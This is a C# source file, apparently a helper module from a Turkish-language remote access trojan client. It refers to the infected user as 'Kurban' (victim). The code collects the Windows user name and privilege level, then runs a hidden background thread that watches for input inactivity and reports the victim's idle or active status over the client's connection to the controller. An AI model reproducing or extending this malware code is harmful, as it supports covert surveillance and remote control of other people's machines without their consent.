using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.Yardımcılar
{
    public static class WindowsAccountHelper
    {
        public static KurbanDurumu LastUserStatus { get; set; }

        public static string GetName()
        {
            return Environment.UserName;
        }

        public static string GetAccountType()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                if (identity != null)
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);

                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                        return "Admin";
                    if (principal.IsInRole(WindowsBuiltInRole.User))
                        return "Kullanıcı";
                    if (principal.IsInRole(WindowsBuiltInRole.Guest))
                        return "Ziyaretçi";
                }
            }

            return "Bilinmiyor";
        }

        public static void StartUserIdleCheckThread()
        {
            new Thread(UserIdleThread) {IsBackground = true}.Start();
        }

        private static void UserIdleThread()
        {
            while (!KuuhakuClient.Exiting)
            {
                Thread.Sleep(5000);
                if (IsUserIdle())
                {
                    if (LastUserStatus != KurbanDurumu.AFK)
                    {
                        LastUserStatus = KurbanDurumu.AFK;
                        new SetUserStatus(LastUserStatus).Execute(Program.ConnectClient);
                    }
                }
                else
                {
                    if (LastUserStatus != KurbanDurumu.Aktif)
                    {
                        LastUserStatus = KurbanDurumu.Aktif;
                        new SetUserStatus(LastUserStatus).Execute(Program.ConnectClient);
                    }
                }
            }
        }

        private static bool IsUserIdle()
        {
            long ticks = Stopwatch.GetTimestamp();

            long idleTime = ticks - NativeMethodsHelper.GetLastInputInfoTickCount();

            idleTime = ((idleTime > 0) ? (idleTime/1000) : 0);

            return (idleTime > 600); // 10 dakikadır afk
        }
    }
}